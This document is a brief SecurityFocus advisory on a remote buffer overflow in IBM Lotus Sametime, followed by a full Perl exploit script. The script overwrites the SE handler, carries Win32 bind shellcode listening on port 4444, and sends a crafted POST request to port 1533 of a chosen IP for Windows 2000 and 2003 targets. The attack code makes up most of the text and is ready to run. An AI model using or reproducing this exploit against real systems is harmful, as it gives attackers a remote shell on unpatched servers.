source: http://www.securityfocus.com/bid/29328/info

IBM Lotus Sametime is prone to a remote buffer-overflow vulnerability because it fails to properly bounds-check user-supplied data before copying it to an insufficiently sized memory buffer.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will likely result in a denial of service. 

#!perl
#
# "IBM Lotus Sametime" StMUX Stack Overflow Exploit
#
# Author:  Manuel Santamarina Suarez
# e-Mail:  FistFuXXer@gmx.de
#

use IO::Socket;
use File::Basename;

#
# destination TCP port
#
$port = 1533;

#
# SE handler
#
# Don't use upper-case ASCII characters or 0x00, 0x0a, 0x0b, 0x0d, 0x20
# You MUST use a POP/POP/RET sequence that doesn't modify the ESP register
#
$seh = reverse( "\x7C\x34\x10\xC2" );  # POP ECX/POP ECX/RET
                                       # msvcr71.7c3410c2
                                       # universal

#
# Shellcode
#
# Win32 Bind Shellcode (EXITFUNC=process, LPORT=4444)
#
$sc = "\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45".
      "\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49".
      "\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d".
      "\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66".
      "\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61".
      "\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40".
      "\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32".
      "\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6".
      "\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09".
      "\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0".
      "\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff".
      "\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53".
      "\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff".
      "\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64".
      "\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89".
      "\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab".
      "\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51".
      "\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53".
      "\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6".
      "\x52\xff\xd0\x68\x7e\xd8\xe2\x73\x53\xff\xd6\xff\xd0";

#
# JUMP to 'ESP adjustment' and shellcode
#
$jmp = "\x74\x23".  # JE SHORT
       "\x75\x21";  # JNZ SHORT


#
#
# Don't edit anything after this line
#
#


sub usage {
    print "Usage: " . basename( $0 ) . " [target] [IPv4 address]\n".
          "Example: ". basename( $0 ) . " 1 192.168.1.32\n".
          "\n".
          "Targets:\n".
          "[1]  Lotus Sametime 7.5 on Windows Server 2000 SP4\n".
          "[2]  Lotus Sametime 7.5 on Windows Server 2003 SP2\n";
    exit;
}


# Net::IP::ip_is_ipv4
sub ip_is_ipv4 {
    my $ip = shift;
    
    if (length($ip) < 7) {
        return 0;
    }

    unless ($ip =~ m/^[\d\.]+$/) {
        return 0;
    }

    if ($ip =~ m/^\./) {
        return 0;
    }

    if ($ip =~ m/\.$/) {
        return 0;
    }

    if ($ip =~ m/^(\d+)$/ and $1 < 256) {
        return 1
    }

    my $n = ($ip =~ tr/\./\./);

    unless ($n >= 0 and $n < 4) {
        return 0;
    }

    if ($ip =~ m/\.\./) {
        return 0;
    }

    foreach (split /\./, $ip) {
        unless ($_ >= 0 and $_ < 256) {
            return 0;
        }
    }
    
    return 1;
}


print "---------------------------------------------------\n".
      ' "IBM Lotus Sametime" StMUX Stack Overflow Exploit'."\n".
      "---------------------------------------------------\n\n";

if( ($#ARGV+1) != 2 ) {
    &usage;
}

# Windows 2000 SP4
if( $ARGV[0] == 1 ) {
    $popad = "\x5b" x 3 .     # POP EBX
             "\x61" x 268 .   # POPAD
             "\xff\x24\x24";  # JMP DWORD PTR SS:[ESP]
}
# Windows 2003 SP2
elsif( $ARGV[0] == 2 ) {
    $popad = "\x5b" x 3 .     # POP EBX
             "\x61" x 269 .   # POPAD
             "\xff\x24\x24";  # JMP DWORD PTR SS:[ESP]
}
else {
    &usage;
}
    
if( ip_is_ipv4( $ARGV[1] ) ) {
    $ip = $ARGV[1];
}
else
{
    &usage;
}

print "[+] Connecting to $ip:$port...\n";

$sock = IO::Socket::INET->new (
    PeerAddr => $ip,
    PeerPort => $port,
    Proto    => 'tcp',
    Timeout  => 2
) or print "[-] Error: Couldn't establish a connection to $ip:$port!\n" and exit;

print "[+] Connected.\n".
      "[+] Trying to overwrite and control the SE handler...\n";

$path = "\x66" x 44 . $jmp . $seh . "\x66" x 29 . $popad;
$sock->send (
    "POST /CommunityCBR/CC.39.$path/\r\n".
    "User-Agent: Sametime Community Agent\r\n".
    "Host: $ip:1533\r\n".
    "Content-Length: ". length( $sc ) ."\r\n".
    "Connection: Close\r\n".
    "Cache-Control: no-cache\r\n".
    "\r\n".
    $sc
);

sleep( 3 );
close( $sock );

print "[+] Done. Now check for a bind shell on $ip:4444!\n";

